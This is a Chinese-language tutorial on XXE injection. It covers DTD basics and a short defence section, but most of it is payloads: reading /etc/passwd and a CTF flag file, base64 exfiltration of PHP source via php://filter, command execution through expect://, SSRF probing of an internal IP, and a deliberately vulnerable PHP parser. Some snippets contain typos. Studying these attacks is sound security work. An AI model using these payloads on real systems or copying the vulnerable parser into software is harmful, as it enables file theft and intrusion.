# XXE

## XML基础

XML（Extensible Markup Language）被设计用来传输和存储数据。

文档类型定义：DTDwikipedia关于这的描述是:The XML DTD syntax is one of several XML schema languages。DTD的作用是定义XML文档的合法构建模块。实体也是构建模块之一。因此可以利用DTD来内部或外部引入实体。通过引用定义在外部的DTD中的实体，我们称之为外部实体。

```
<!DOCTYPE 根元素名 [元素描述]>
```

内部引用

```
<!ENTITY 实体名称 "实体的值">
```

外部引用

```
<!ENTITY 实体名称 SYSTEM "URI">
```



- 函数说明

```
SimpleXML 函数
simplexml_import_dom  — 从DOM节点获取SimeXMLEngle对象
simplexml_load_file   — 将XML文件解释为对象
simplexml_load_string — 将XML字符串解释为对象
```

函数演示：

```
<?php
$dom = new domDocument;
$dom->loadXML('<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY file "Hello World!"  >]>
<root>
<info>&file;</info>
</root>');

$xml = simplexml_import_dom($dom);

echo $xml->info;
?>
```

访问该XML文档，&file;会被解析为Hello World!并输出。



## 利用方式

利用文件协议读取本地文件，比如file协议。

| libxml2 | PHP            | Java   | .NET  |
| ------- | -------------- | ------ | ----- |
| file    | file           | http   | file  |
| http    | http           | https  | http  |
| ftp     | ftp            | ftp    | https |
|         | php            | file   | ftp   |
|         | compress.zlib  | jar    |       |
|         | compress.bzip2 | netdoc |       |
|         | data           | mailto |       |
|         | glob           | gopher |       |
|         | phar           |        |       |

file协议读取文件示例：

```
POST /api/v1.0/try HTTP/1.1
Host: web.jarvisoj.com:9882
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/xml
Referer: http://web.jarvisoj.com:9882/
Content-Length: 175
Cookie: __cfduid=d5003f0545042bbe0fbc573cda35051f71472823285; UM_distinctid=15abdd622a49f-02e5d4fef34197-7f682331-100200-15abdd622a5cf; role=s%3A5%3A%22guest%22%3B; hsh=3a4727d57463f122833d9e732f94e4e0
Connection: close

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:////home/ctf/flag.txt" >]>
<root>
<search>name</search>
<value>&xxe;</value>
</root>

```



## 漏洞代码

```
<?php
# Enable the ability to load external entities
libxml_disable_entity_loader (false);
show_source(__FILE__);
$xmlfile = file_get_contents('php://input'); //接受POST请求
echo '<br>';
if(strlen($xmlfile)>0){

$dom = new DOMDocument();

$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); // this stuff is required to make sure

$creds = simplexml_import_dom($dom); //解析xml
$user = $creds->user;
$pass = $creds->pass;

echo "You have logged in as user $user";
}
?>
```

如果要读取php文件，因为php、html等文件中有各种括号<，>，若直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。

```
php://filter/read=convert.base64encode/rsource=
```

Payload：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" >
    ]>
<root>
    <user>&file;</user>
    <pass>mypass</pass>
</root>

# 读取passwd文件

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >
    ]>
<root>
<user>&xxe;</user>
<pass>mypass</pass>
</root>
```

**其他攻击方式**

- 命令执行

php环境下，xml命令执行要求php装有expect扩展。

```
<?php
$xml = <<<EOF
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "except://ls"> # id
]>
<x>&f;</x>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
```

- 内网探测/SSRF

由于xml实体注入攻击可以利用http://协议发起http请求。所以可以利用该请求去探查内网进行SSRF攻击。

```
<?php
$xml = <<<EOF
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "http://192.168.1.1:80/">
]>
<x>&f;</x>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
```

## XXE漏洞防御

配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。可将外部实体、参数实体和内联DTD 都被设置为false，避免基于XXE漏洞的攻击。



## 技巧收集

 [理解XXE从基础到盲打](https://www.cnblogs.com/17bdw/p/10098181.html)